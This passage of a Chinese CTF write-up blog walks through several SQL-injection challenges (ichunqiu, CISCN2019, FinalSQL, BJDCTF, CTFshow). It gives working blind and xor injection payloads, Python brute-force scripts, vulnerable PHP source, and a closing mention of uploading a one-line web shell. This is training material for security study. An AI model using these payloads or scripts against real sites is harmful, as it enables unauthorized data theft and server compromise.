        d &#x3D; &quot;1^(ascii(substr((select group_concat(table_name,&#39;&#39;) from sys.x$schema_flattened_keys),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)
        data &#x3D; &#123;&quot;id&quot;:d&#125;
        r &#x3D; requests.post(url,data &#x3D; data)
        if &#39;Nu1L&#39; not in r.text:
            print(chr(j),end&#x3D;&#39;&#39;)
            break</code></pre>

<p>得到两个表名，<code>f1ag_1s_h3r3_hhhhh</code>、<code>users233333333333333</code></p>
<p><code>flag</code>应该在<code>f1ag_1s_h3r3_hhhhh</code>中，这里需要用到一个技巧，就是将查询语句与相同数量的列进行比较，<a target="_blank" rel="noopener" href="https://nosec.org/home/detail/3830.html">参考</a>，如图</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/sFLidjDgr5weSft.png" style="zoom: 80%;" loading="lazy">

<p>而在mysql中，比较字符串大小是按位比较的，所以就可以用比较大小的方法一个一个的得到字段的内容</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/JIK9gluR1khN6zr.png" style="zoom:80%;" loading="lazy">

<p>注：出题人这里还有一个坑，详见题目下方的链接</p>
<p>mysql默认是不区分大小写的区分大小写的注入，所以在爆字段的时候需要注意，但由于比赛flag都是小写，所以就直接盲注就可以了，但这里还是给出区分大小写的方法，<code>BINARY(&quot;A&quot;)</code>、<code>CAST(&quot;A&quot; AS JSON)</code>都会返回大写的A，当<code>in</code>被过滤了<code>BINARY</code>就不好使了，所以用第二个就OK</p>
<p>这里可以测试出有两个列，但是盲猜第一列的第一个是1可还行</p>
<p>Payload：<code>1^((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))</code></p>
<p>于是写出盲注爆字段脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import string
url &#x3D; &quot;http:&#x2F;&#x2F;a9362c1023c04da19c143e01d7991148619db7d8fbff4e43.changame.ichunqiu.com&#x2F;index.php&quot;
str &#x3D; (&quot;-&quot; + string.digits + string.ascii_letters + string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&quot;\\&quot;,&quot;&quot;)
flag &#x3D; &quot;&quot;
for i in range(1,100):
    for j in str:
        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;
        d &#x3D; &quot;1^((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;.format(flag+j)
        data &#x3D; &#123;&quot;id&quot;:d&#125;
        r &#x3D; requests.post(url,data &#x3D; data)
        if &#39;Nu1L&#39; in r.text:
            print(j,end&#x3D;&#39;&#39;)
            break
    flag &#x3D; flag + j</code></pre>

<p>最终可以得到flag</p>
<h3 id="2020ichunqiu新春公益赛—简单的招聘系统"><a href="#2020ichunqiu新春公益赛—简单的招聘系统" class="headerlink" title="2020ichunqiu新春公益赛—简单的招聘系统"></a>2020ichunqiu新春公益赛—简单的招聘系统</h3><p>首先有个登录界面</p>
<p>尝试使用弱密码，<code>1&#39; or 1=1#</code></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/tuM3g2DS8hEQ1WL.png" alt loading="lazy"></p>
<p>于是可以在登录界面进行布尔盲注</p>
<p>爆库Payload：<code>2&#39; or (select (mid((select database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p>
<p>爆表Payload：<code>2&#39; or (select (mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema=database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p>
<p>爆列Payload：<code>2&#39; or (select (mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;flag&#39;),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p>
<p>爆字段Payload：<code>2&#39; or (select (mid((select group_concat(flaaag,&#39;&#39;) from flag),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import string
url &#x3D; &quot;http:&#x2F;&#x2F;b191000b2d4c4a77ad9c86f2d5476e7172ed2000f40b4c72.changame.ichunqiu.com&#x2F;&quot;
str &#x3D; (&quot;-&quot; + string.digits + string.ascii_letters + string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&quot;\\&quot;,&quot;&quot;)
flag &#x3D; &quot;&quot;
for i in range(1,100):
    for j in str:
        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;
        d &#x3D; &quot;(This is Payload)&quot;.format(i,j)
        #print(d)
        data &#x3D; &#123;&quot;lname&quot;:d , &quot;lpass&quot;:&#39;xxx&#39;&#125;
        r &#x3D; requests.post(url,data &#x3D; data)
        r.encoding &#x3D; &#39;gbk&#39;
        if &#39;成功&#39; in r.text.encode(&#39;gbk&#39;).decode(r.apparent_encoding):
            print(j,end&#x3D;&#39;&#39;)
            break</code></pre>

<p>得到数据库：<code>nzhaopin</code>,表：<code>backup,flag,user</code>，flag表的内容：<code>id,flaaag</code>，最终得到flag</p>
<h3 id="CISCN2019-Web1—Hack-World"><a href="#CISCN2019-Web1—Hack-World" class="headerlink" title="CISCN2019-Web1—Hack World"></a>CISCN2019-Web1—Hack World</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p>
<p>界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/t2nS8YpRmGTEsx7.png" alt loading="lazy"></p>
<p>题目给出了flag在flag表和flag列中</p>
<p>测试后发现过滤了大多数字符，但有些还是没过滤的，于是进行sql盲注</p>
<p>空格利用<code>()</code>绕过，配合异或注入和判断回显信息一个一个爆出字符串</p>
<p>python脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;13b50f67-3a54-481d-ae76-97f425fd8855.node3.buuoj.cn&#x2F;&quot;
for i in range(1,100):
    for j in range(1,128):
        d &#x3D; &quot;1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)
        data &#x3D; &#123;&quot;id&quot;:d&#125;
        r &#x3D; requests.post(url,data &#x3D; data)
        print(r.status_code)
        if &#39;Error&#39; in r.text:
            print(chr(j),end&#x3D;&#39;&#39;)</code></pre>

<p>网上这题的源码，可以参考参考</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
$dbuser&#x3D;&#39;root&#39;;
$dbpass&#x3D;&#39;root&#39;;

function safe($sql)&#123;
    #被过滤的内容 函数基本没过滤
    $blackList &#x3D; array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;&#96;&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;.&#x2F;&#39;);
    foreach($blackList as $blackitem)&#123;
        if(stripos($sql,$blackitem))&#123;
            return False;
        &#125;
    &#125;
    return True;
&#125;
if(isset($_POST[&#39;id&#39;]))&#123;
    $id &#x3D; $_POST[&#39;id&#39;];
&#125;else&#123;
    die();
&#125;
$db &#x3D; mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);
if(!$db)&#123;
    die(mysql_error());
&#125;   
mysql_select_db(&quot;ctf&quot;,$db);

if(safe($id))&#123;
    $query &#x3D; mysql_query(&quot;SELECT content from passage WHERE id &#x3D; $&#123;id&#125; limit 0,1&quot;);
    
    if($query)&#123;
        $result &#x3D; mysql_fetch_array($query);
        
        if($result)&#123;
            echo $result[&#39;content&#39;];
        &#125;else&#123;
            echo &quot;Error Occured When Fetch Result.&quot;;
        &#125;
    &#125;else&#123;
        var_dump($query);
    &#125;
&#125;else&#123;
    die(&quot;SQL Injection Checked.&quot;);
&#125;</code></pre>

<h3 id="极客大挑战—FinalSQL"><a href="#极客大挑战—FinalSQL" class="headerlink" title="极客大挑战—FinalSQL"></a>极客大挑战—FinalSQL</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p>
<p>在用户名和密码密码处尝试注入，发现绝大多数的字符都被过滤，于是找到另一个注入点（如下图），把注释删掉后在界面传参回车后观察URL的变化，传了一个id参数，故尝试在URL中的id处注入</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/MK1eADvmQB6dsRu.png" style="zoom: 80%;" loading="lazy">

<p>后台过滤到限制字符的显示的界面（如下图）</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/R4IgVByGQD1h6Pk.png" style="zoom:33%;" loading="lazy">

<p>当注入上一题的查询数据库语句时，发现可以注入，显示以下界面，应该是后台把报错的界面给处理了，所以看不到数据库报错的界面</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/yjbmJD4Ocn76fCA.png" style="zoom:33%;" loading="lazy">

<p>进行异或注入测试，通过测试发现，id=1^1的结果和id=0的结果是一样的，当id=1^0的时候，界面就返回了当id=1的时候的界面，由此可以想到通过构造ASCII函数配合substr函数判断字符大小，当ASCII函数值等于（居然没过滤）后面的十进制时，显示id=0的时候的界面，具体脚本和判断方法如下：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1^(ascii(substr((&quot;此处为sql语句&quot;),变量i,1))&#x3D;变量j)</code></pre>

<p>查库：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;
for i in range(1,20):
    for j in range(1,128):
        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like&#39;geek&#39;)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;
        r &#x3D; requests.get(url+d)
        if &#39;ERROR&#39; in r.text:
            print(chr(j),end&#x3D;&#39;&#39;)</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/31rlIa5vfeoYkNF.png" alt loading="lazy"></p>
<p>查表：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;
for i in range(1,20):
    for j in range(1,128):
        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)&#x3D;&#39;geek&#39;)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;
        r &#x3D; requests.get(url+d)
        if &#39;ERROR&#39; in r.text:
            print(chr(j),end&#x3D;&#39;&#39;)</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/iOdeEnDWUwNK8V3.png" alt loading="lazy"></p>
<p>查列：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;
for i in range(1,20):
    for j in range(1,128):
        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)&#x3D;&#39;F1naI1y&#39;)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;
        r &#x3D; requests.get(url+d)
        if &#39;ERROR&#39; in r.text:
            print(chr(j),end&#x3D;&#39;&#39;)</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DTSb4nMyjg6e89R.png" alt loading="lazy"></p>
<p>emmmmmmm这里长度没给够，根据前面的经验，查password列应该就可以了，F1aaaaag表中没有东西</p>
<p>查字段：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;
for i in range(1,300):
    for j in range(1,128):
        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;
        r &#x3D; requests.get(url+d)
        if &#39;ERROR&#39; in r.text:
            print(chr(j),end&#x3D;&#39;&#39;)</code></pre>

<p>拿到flag：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RvGOsyKqSXYNEug.png" alt loading="lazy"></p>
<h3 id="BJDCTF-2nd—简单注入"><a href="#BJDCTF-2nd—简单注入" class="headerlink" title="BJDCTF-2nd—简单注入"></a>BJDCTF-2nd—简单注入</h3><p><strong>解题核心</strong>—————–regexp()正则匹配，binary大小写匹配，布尔盲注(亦可时间盲注)</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection">https://www.gem-love.com/ctf/2097.html#GirlfriendInjection</a></p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/rODhM3lG8ux9Hdf.png" style="zoom:80%;" loading="lazy">

<p>这题看着界面有点眼熟，这这个网站上有个类似的题<a target="_blank" rel="noopener" href="http://pcat.cc/q.php">http://pcat.cc/q.php</a> ，Question 5那一期的web题</p>
<p>先fuzz一下，以下字符被过滤：</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/FnfpO9AMlex8UdC.png" style="zoom: 80%;" loading="lazy">

<p>几个常用的注入参数被过滤：<code>&#39; &quot; select</code>，这几个参数被过滤就已经杀了大部分的可注入方式，于是想办法构造注入条件，题目解题思路和Question 5那一期的web题类似，直接给出解题方法</p>
<p>解题方法：在用户名处注入反斜杆<code>\</code>，可以将后端<code>sql</code>语句处<code>username</code>的后面的单引号转义</p>
<p>推测后端sql语句变成</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">select username password from users where username &#x3D; &#39;1\&#39; and password &#x3D; &#39; or 1#&#39;</code></pre>

<p>测试后发题目下方的字符串改变了（可惜比赛的时候没注意），可以用regexp正则模糊匹配的方法构造sql注入语句注出<code>admin</code>的<code>password</code>，于是写<code>python</code>脚本盲注</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/Vc2DsFmxGRngN4p.png" style="zoom: 80%;" loading="lazy">

<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;507fd7ed-7cc8-42d3-86ad-6b5ec032b815.node3.buuoj.cn&#x2F;index.php&quot;
header &#x3D; &#123;
    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0&quot;,
    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,
    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;
&#125;
str1 &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;
passwd &#x3D; &#39;&#39;
pass1 &#x3D; &#39;&#39;
for i in range(100):
    for j in str1:
        pass1 &#x3D; &#39;0x5E&#39; + passwd.replace(&#39;0x5E&#39;,&#39;&#39;) + hex(ord(j)).replace(&#39;0x&#39;,&#39;&#39;)
        payload &#x3D; &#39; or password regexp binary &#123;&#125;#&#39;.format(pass1)
        #print(pass1)
        data &#x3D; &#123;
            &#39;username&#39;: &#39;1\\&#39;,
            &#39;password&#39;: payload
        &#125;
        r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;header)
        if &#39;BJD needs&#39; in r.text:
            passwd &#x3D; passwd + hex(ord(j)).replace(&#39;0x&#39;,&#39;&#39;)
            print(j,end&#x3D;&#39;&#39;)
            break</code></pre>

<p>注意这里<code>binary</code>的使用，比赛的时候就是被这里给坑了=.=，mysql默认不区分大小写，这里使用该关键字来区分大小写，还有<code>regexp</code>函数可以匹配十六进制数，涨姿势了，这样就可以绕过引号的过滤，另外上面的<code>Ezsqli</code>题也还有一种匹配大小写的方法，用于<code>in</code>被过滤，<code>binary</code>就不好使了</p>
<p>最后盲注出<code>password</code>为<code>OhyOuFOuNdit</code>登录<code>admin</code>账号即可得到<code>flag</code></p>
<p>另外还有一种时间盲注的方法： <code>or if(substr(password,1,1)regexp binary 0x5E...,sleep(3),1)</code></p>
<h3 id="CTFshow—web1"><a href="#CTFshow—web1" class="headerlink" title="CTFshow—web1"></a>CTFshow—web1</h3><p>访问<code>www.zip</code>得到源码</p>
<p>index.php（略）</p>
<p>login.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
		error_reporting(0);
		session_start();
		$con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);
        if (!$con)
        &#123;
            die(&#39;Could not connect: &#39; . mysqli_error());
        &#125;
		$username&#x3D;$_POST[&#39;username&#39;];
		$password&#x3D;$_POST[&#39;password&#39;];
		if(isset($username) &amp;&amp; isset($password))&#123;
			if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\&#96;|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\&#x3D;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$username))&#123;
				die(&quot;error&quot;);
			&#125;
			$sql&#x3D;&quot;select pwd from user where uname &#x3D; &#39;$username&#39; limit 1&quot;;
			$res&#x3D;mysqli_query($con,$sql);
			$row &#x3D; mysqli_fetch_array($res);
			if($row[&#39;pwd&#39;]&#x3D;&#x3D;&#x3D;$password)&#123;
				$_SESSION[&quot;login&quot;] &#x3D; true;
				header(&quot;location:&#x2F;user_main.php?order&#x3D;id&quot;);
			&#125;else&#123;
				header(&quot;location:&#x2F;index.php&quot;);
			&#125;
		&#125;else&#123;
			header(&quot;location:&#x2F;index.php&quot;);
		&#125;

?&gt;</code></pre>

<p>reg.html（略）</p>
<p>reg.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
		error_reporting(0);
		$con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);
        if (!$con)
        &#123;
            die(&#39;Could not connect: &#39; . mysqli_error());
        &#125;
		$username&#x3D;$_POST[&#39;username&#39;];
		$password&#x3D;$_POST[&#39;password&#39;];
		$email&#x3D;$_POST[&#39;email&#39;];
		$nickname&#x3D;$_POST[&#39;nickname&#39;];
		if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\&#x3D;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$username))&#123;
				die(&quot;error&quot;);
		&#125;
		if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\&#x3D;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$password))&#123;
				die(&quot;error&quot;);
		&#125;
		if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\!|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;\]|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$email))&#123;
				die(&quot;error&quot;);
		&#125;
		if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$nickname))&#123;
				die(&quot;error&quot;);
		&#125;
		if(isset($username) &amp;&amp; isset($password) &amp;&amp; isset($email) &amp;&amp; isset($nickname))&#123;
			$sql &#x3D; &quot;INSERT INTO user (uname, pwd, email,nname) VALUES (&#39;$username&#39;, &#39;$password&#39;, &#39;$email&#39;,&#39;$nickname&#39;)&quot;;
            $res&#x3D;mysqli_query($con, $sql);
            if ($res) &#123;
				$_SESSION[&quot;login&quot;] &#x3D; true;
				header(&quot;location:&#x2F;index.php&quot;);
			&#125; 
		&#125;
		mysqli_close($conn);
		

?&gt;</code></pre>

<p>user_main.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
session_start();
?&gt;
&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
&lt;title&gt;CTFshow_web&lt;&#x2F;title&gt;

&lt;style&gt;
..........(css)
&lt;&#x2F;style&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
&lt;?php
	
	if(isset($_SESSION[&quot;login&quot;]) &amp;&amp; $_SESSION[&quot;login&quot;] &#x3D;&#x3D;&#x3D; true)&#123;
		$con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);
        if (!$con)
        &#123;
            die(&#39;Could not connect: &#39; . mysqli_error());
        &#125;
		$order&#x3D;$_GET[&#39;order&#39;];
		if(isset($order) &amp;&amp; strlen($order)&lt;6)&#123;
			if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\&#96;|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;|\[|\]|\;|\:|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?|\,|\.|\?&#x2F;i&quot;,$order))&#123;
				die(&quot;error&quot;);
			&#125;
			$sql&#x3D;&quot;select * from user order by $order&quot;;
        &#125;else&#123;
            $sql&#x3D;&quot;select * from user order by id&quot;;
        &#125;   

?&gt;
..........(html)
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;</code></pre>

<p>可以看到可传入的值都经过了严格的过滤，大多数特殊符号都被过滤，所以直接进行sql注入显然不可能，寻找其他的入手点，可以看到在<code>user_main.php</code>的传入的<code>order</code>值处，有一条<code>order by</code>语句，是用来根据<code>order by</code>后面的列来进行排序的，根据题目提示<code>flag_is_my_password</code>，所以我们只需要得到用户<code>flag</code>的密码即可，于是我们可以根据<code>pwd</code>的值来排序，然后配合盲注得出<code>flag</code>，我们注册不同密码的账号，原理假设密码为<code>e</code>（前端有个<code>md5</code>加密抓包可以直接绕过不影响），如果<code>flag</code>的密码为<code>flag&#123;xxxxx&#125;</code>那么<code>e</code>&lt;<code>flag&#123;xxxxx&#125;</code>，再传入<code>user_main.php?order=pwd</code>，那么密码为<code>e</code>的这一行就在flag这一行的上面。而如果注册一个密码为<code>g</code>的用户，则密码为<code>g</code>的用户的这一行则会在<code>flag</code>这一行的下面，于是就可以拿来进行盲注比较得出<code>flag</code>的所有值</p>
<p>exp</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;https:&#x2F;&#x2F;b51823a7-b1c0-499d-878a-8a5b296655d3.chall.ctf.show&quot;
urlreg &#x3D; url + &quot;&#x2F;reg.php&quot;  #注册 必须要是可传参php文件
urllogin &#x3D; url + &quot;&#x2F;login.php&quot;  #登录 必须要是可传参php文件
urlorder &#x3D; url + &quot;&#x2F;user_main.php?order&#x3D;pwd&quot;  # 显示

s &#x3D; &quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;  # 按照ascii码表的字符串大小排序
flag &#x3D; &quot;&quot;
for i in range(100):
    for j in s:
        exp &#x3D; &quot;&quot;
        exp &#x3D; flag + j
        datereg &#x3D; &#123;
            &quot;username&quot;:exp,  # 仔细观察username和password并没有对-和&#123;&#125;进行过滤
            &quot;email&quot;:&quot;zzz&quot;,
            &quot;nickname&quot;:&quot;zzz&quot;,
            &quot;password&quot;:exp
        &#125;
        datelogin &#x3D; &#123;
            &quot;username&quot;:exp,
            &quot;password&quot;:exp
        &#125;
        if (exp &#x3D;&#x3D; &#39;flag&#39;):  # 当注册的用户名字为flag的时候，因为已经存在flag用户在，额直接打印flag跳过后面的语句的执行
            flag &#x3D; &#39;flag&#39;
            print(flag)
            break
        session &#x3D; requests.session()  # 保持会话
        reg &#x3D; session.post(urlreg, datereg)
        login &#x3D; session.post(urllogin, datelogin)
        a &#x3D; session.get(urlorder)
        txt &#x3D; a.text
        if (txt.index(&quot;&lt;td&gt;&quot;+exp+&quot;&lt;&#x2F;td&gt;&quot;)&gt;txt.index(&quot;&lt;td&gt;flag@ctf.show&lt;&#x2F;td&gt;&quot;)):  # index返回字符串被找到到最小的索引（最左）
            flag &#x3D; flag + chr(ord(j)-1)   # 得到的字符为比flag的单个字符的值大1，所以需要-1
            print(flag)
            break</code></pre>

<p>最终得到到flag</p>
<h3 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="CISCN2019-总决赛-Day2-Web1-Easyweb"></a>CISCN2019-总决赛-Day2-Web1-Easyweb</h3><p>robots.txt内容如下</p>
<pre class="language-none"><code class="language-none">User-agent: *
Disallow: *.php.bak</code></pre>

<p>于是找<code>.bak</code>文件，发现存在image.php.bak，下载下来后得到image.php的源码如下:</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
include &quot;config.php&quot;;

$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;
$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;

$id&#x3D;addslashes($id);
$path&#x3D;addslashes($path);

$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);

$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);
$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);

$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];
header(&quot;Content-Type: image&#x2F;jpeg&quot;);
readfile($path);</code></pre>

<p>发现存在sql注入，通过传入id为<code>\\0</code>来转义id后面的引号，与path前面的引号闭合导致sql注入</p>
<p>exp如下：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests

url &#x3D; &quot;http:&#x2F;&#x2F;a371750a-b2b0-4f95-9c4f-c2cf5292c17c.node3.buuoj.cn&#x2F;image.php&quot;
result &#x3D; &quot;&quot;

# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select database()),&#123;&#125;,1))?&#123;&#125;,1,0)--+
# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+  images,users
# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+  username,password
# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+   8e97f11c1585e0f6dedb
# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(username) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+   admin
payload &#x3D; &quot;?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+&quot;

for i in range(0, 100):
    high &#x3D; 127
    low &#x3D; 32
    mid &#x3D; (low + high) &#x2F;&#x2F; 2
    while high &gt; low:
        payloads &#x3D; payload.format(i, mid)
        # print(url + payloads)
        html &#x3D; requests.get(url + payloads)
        if &#39;JFIF&#39; in html.text:
            low &#x3D; mid + 1
        else:
            high &#x3D; mid
        mid &#x3D; (low + high) &#x2F;&#x2F; 2
    result +&#x3D; chr(int(mid))
    print(result)</code></pre>

<p>得到admin的密码登录后是一个文件上传的页面，上传的文件会自动生成一个日志并且告诉了我们路径且后缀为php文件，上传后打开界面会显示文件的名字，于是抓包将文件名改为一句话木马，上传后php就会解析这个页面里的php语法，但是文件名字不能有php在里面，于是就需要一句话的短标签版，前提需要PHP开启短标签即<code>short_open_tag=on</code>，题目支持，随后<code>cat /flag</code>即可</p>
